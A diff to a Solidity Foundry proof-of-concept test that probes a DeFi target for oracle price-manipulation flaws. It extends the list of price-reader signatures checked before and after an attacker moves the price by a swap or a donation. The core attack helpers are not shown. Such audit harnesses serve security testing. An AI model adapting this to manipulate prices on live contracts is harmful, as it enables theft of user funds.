@@ -62,7 +62,11 @@ contract PoC is Test {
         if (i == 3) return abi.encodeWithSignature("price()");
         if (i == 4) return abi.encodeWithSignature("getReserves()");
         if (i == 5) return abi.encodeWithSignature("exchangeRate()");
-        return abi.encodeWithSignature("consult(address,uint256)", tokenOut, uint256(1));
+        if (i == 6) return abi.encodeWithSignature("consult(address,uint256)", tokenOut, uint256(1));
+        if (i == 7) return abi.encodeWithSignature("getPrice(address)", tokenOut);
+        if (i == 8) return abi.encodeWithSignature("getLatestPrice(address)", tokenOut);
+        if (i == 9) return abi.encodeWithSignature("peek()");
+        return abi.encodeWithSignature("spot()");
     }
 
     function _readerName(uint8 i) internal pure returns (string memory) {
@@ -72,7 +76,11 @@ contract PoC is Test {
         if (i == 3) return "price()";
         if (i == 4) return "getReserves()";
         if (i == 5) return "exchangeRate()";
-        return "consult(address,uint256)";
+        if (i == 6) return "consult(address,uint256)";
+        if (i == 7) return "getPrice(address)";
+        if (i == 8) return "getLatestPrice(address)";
+        if (i == 9) return "peek()";
+        return "spot()";
     }
 
     function _fingerprint(bytes memory data) internal view returns (bool ok, uint256 fp) {
@@ -119,9 +127,9 @@ contract PoC is Test {
     /// Snapshot every reader that works BEFORE the price-moving action, then
     /// move the price, then look for a reader whose value MOVED.
     function _tryEntry(address attacker, uint8 mode) internal returns (string memory used) {
-        bool[7] memory worked;
-        uint256[7] memory before;
-        for (uint8 i = 0; i < 7; i++) {
+        bool[11] memory worked;
+        uint256[11] memory before;
+        for (uint8 i = 0; i < 11; i++) {
             (bool ok, uint256 fp) = _fingerprint(_readerData(i, TOKEN_OUT));
             worked[i] = ok;
             before[i] = fp;
@@ -129,7 +137,7 @@ contract PoC is Test {
 
         _movePrice(attacker, mode);
 
-        for (uint8 i = 0; i < 7; i++) {
+        for (uint8 i = 0; i < 11; i++) {
             if (!worked[i]) continue;
             used = _attempt(attacker, before[i], _readerName(i), _readerData(i, TOKEN_OUT));
             if (bytes(used).length > 0) return used;
@@ -146,7 +154,7 @@ contract PoC is Test {
 
         assertTrue(
             bytes(used).length > 0,
-            "no spot-price reader reproduced. Tried getPrice(), latestAnswer(), latestRoundData(), price(), getReserves(), exchangeRate(), consult(address,uint256). This does NOT establish safety: the target may price through a reader under another name or signature, or the swap may not move the exact venue it reads."
+            "no spot-price reader reproduced. Tried getPrice(), latestAnswer(), latestRoundData(), price(), getReserves(), exchangeRate(), consult(address,uint256), getPrice(address), getLatestPrice(address), peek(), spot(). This does NOT establish safety: the target may price through a reader under another name or signature, or the swap may not move the exact venue it reads."
         );
     }
 
@@ -159,7 +167,7 @@ contract PoC is Test {
 
         assertTrue(
             bytes(used).length > 0,
-            "no balance-as-price reader reproduced. Tried getPrice(), latestAnswer(), latestRoundData(), price(), getReserves(), exchangeRate(), consult(address,uint256). This does NOT establish safety: the target may price off its own balance through a reader under another name, or the donation may be routed elsewhere."
+            "no balance-as-price reader reproduced. Tried getPrice(), latestAnswer(), latestRoundData(), price(), getReserves(), exchangeRate(), consult(address,uint256), getPrice(address), getLatestPrice(address), peek(), spot(). This does NOT establish safety: the target may price off its own balance through a reader under another name, or the donation may be routed elsewhere."
         );
     }
 }
